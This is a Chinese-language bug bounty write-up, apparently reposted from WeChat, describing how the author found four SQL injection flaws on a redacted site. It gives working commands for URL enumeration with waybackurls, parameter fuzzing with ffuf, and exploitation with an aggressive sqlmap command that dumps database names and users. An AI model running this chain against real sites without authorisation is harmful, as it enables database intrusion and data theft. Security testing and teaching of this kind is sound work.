# 如何在几分钟内找到多个 SQL 注入漏洞

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzkwMTE4NDM5NA==&mid=2247485336&idx=1&sn=e21988be29ed46e55e07b2df5f5bd3c5&chksm=c0b9e97df7ce606b8ee34ac00c27794114b9a01c2567899197601ec2bd63eeaed493968c6e6c&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzkwMTE4NDM5NA==&mid=2247485336&idx=1&sn=e21988be29ed46e55e07b2df5f5bd3c5&chksm=c0b9e97df7ce606b8ee34ac00c27794114b9a01c2567899197601ec2bd63eeaed493968c6e6c&scene=27#wechat_redirect)

今天来分享一下我是如何用几分钟发现某个漏洞赏金的目标多个 SQL 注入漏洞的，接下来以目标域名 redacted.org 为例。

### 枚举阶段

首先我使用 waybackurls 工具查看目标网站上有哪些 URL，然后看到了很多 PHP 的文件，也许可以在其中找到 SQL 注入漏洞，使用命令过滤一些结果之后输出到文件：

> waybackurls https://redacted.org/ | uro | grep “.php” > php-files.txt

![](../Images/fa094fc27872dbb6095d51ce59bc4c48.png)

查看输出的文件，发现了如图中的内容：

![](../Images/50a3f61c0202b96212642f6cfd9ac1e0.png)

看文件名感觉似乎有戏，接下来需要找一些可用的参数，需要制作一个参数名字典然后暴力破解这些页面，搞起

![](../Images/722e7c1f7ea4b2e15ef7b302ee609148.png)

### 获取参数

我们基于之前输出的内容，将文件名和参数分离出来，然后去重：

> cat php-files.txt| grep -i get | sed 's/.\*.get//' | sort -u

![](../Images/7d4ad59c1dcaddab405aee70ad1a261b.png)

接下来删除 php 后缀，得到一个以文件名为关键词的列表，只需在上一条命令后加上 `cut -f1 -d` 即可：

![](../Images/6b0142d9b1f5c93f6137dbf271ae8143.png)

结果中有的有两个单词或者多个单词的组合，但是我不知道其中那个单词是参数，所以就想办法将其拆分，经过一顿搜索，发现可以用命令：

> sed 's/\[AZ\]+/\\n&/g'

![](../Images/a49925962370132f6abba832d5511a2d.png)

我认为参数一般都是小写，所以需要将所有大写字符转换为小写，且保留之前的内容：

![](../Images/d42752aa7c807d72bf85e89a60d3d1dc.png)

接下来我们有了两个参数字典可用，然后使用工具 FFUF 来进行测试，先尝试用全是小写字符的字典：

> ffuf -w lowercase-parameters.txt -u "https://redacted.org/searchProgressCommitment.php?FUZZ=5"

但是没有任何结果

![](../Images/ea8eecc110f6cc0e93bf55fbed06297d.png)

老实说，我很郁闷，但是突然想到一个方案，把请求的方法改成 POST 怎么样？命令如下：

> ffuf -w lowercase-parameters.txt -X POST -d "FUZZ=5" -u "https://redacted.org/searchProgressCommitment.php"

结果得到了 **commitment & id** 参数 

![](../Images/c6aa27fba011a984d243d33d80fa46df.png)

接下来我可以对这些参数进行测试了，复制请求的数据包内容到文件中，丢给 sqlmap 去测

### 漏洞利用

sqlmap 的命令如下：

> sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast

![](../Images/9b3c8f1457bd7984904c2aa3c67251a6.png)

漏洞测试成功，确实存在 SQL 注入漏洞

![](../Images/96466615ee02de4cc89aca542126455f.png)

接下来使用同样的方法，测试其他 URL ，结果我找到了三个同样存在 SQL 注入漏洞的地方

![](../Images/fb5d3cf7006436068401df9b8ef71601.png)

第二个 SQLI：带有 **id** 参数的 ws\_delComment.php

![](../Images/e08e587ffeedadd6097fc33fc243cfa7.png)

第三个 SQLI：带有 **target** 参数的 getTargets.php

![](../Images/b1ba8d152fa4f3474d3411c9281dbf3f.png)

第四个：mailing\_lists.php 带 **list** 参数

![](../Images/1ae36dc6f576b4577917300d24c56ddb.png)

一共发现四个 SQL 注入，太棒了
